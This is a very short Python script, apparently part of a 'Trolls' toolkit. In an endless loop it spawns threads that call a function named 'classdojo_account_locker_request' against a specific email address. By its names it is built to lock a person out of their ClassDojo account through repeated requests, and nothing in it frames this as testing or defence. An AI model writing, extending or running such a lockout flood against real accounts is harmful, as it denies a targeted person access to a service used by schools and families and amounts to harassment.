import Tools.Backend.Trolls
from Libs import ThreadManager

while True:
    ThreadManager.do_thread(Tools.Backend.Trolls.classdojo_account_locker_request, ("jeff@gmail.com", "",))